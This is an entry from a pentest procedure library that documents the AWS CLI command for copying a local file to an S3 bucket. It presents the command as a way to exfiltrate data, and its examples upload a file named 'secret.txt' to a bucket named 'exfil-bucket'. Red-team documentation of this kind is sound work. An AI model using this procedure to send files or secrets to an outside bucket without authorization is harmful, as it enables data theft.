---
id: 181a0609-f811-465a-90fc-7bce60782934
name: aws s3 copy file to bucket
type: command
executor: bash
data: |
  aws s3 cp $FILE s3://$AWS_S3_BUCKET
output: null
created_at: '2020-07-31T04:25:22.639129+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - AWS
  - Linux
tags:
  - aws
  - s3
  - upload
verified: true
validated: true
---

# aws s3 copy file to bucket

## Command

```bash
aws s3 cp $FILE s3://$AWS_S3_BUCKET
```

## Description

This command copies a single local file to the root of an S3 bucket using the AWS CLI, suitable for targeted data exfiltration during pentests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $FILE | Local path to the file to upload (e.g., /path/to/file.txt) | Yes |
| $AWS_S3_BUCKET | Name of the target S3 bucket (e.g., exfil-bucket) | Yes |

## Examples

### Basic Usage

```bash
aws s3 cp secret.txt s3://my-bucket
```

### Advanced Usage

```bash
aws s3 cp /tmp/logs.txt s3://my-bucket --acl private
```

## Expected Output

Upload progress bar showing bytes transferred, followed by a success message like "upload: secret.txt to s3://my-bucket/secret.txt".

## Related

- [[procedures/aws-copy-files-or-folder-to-s3-bucket]]
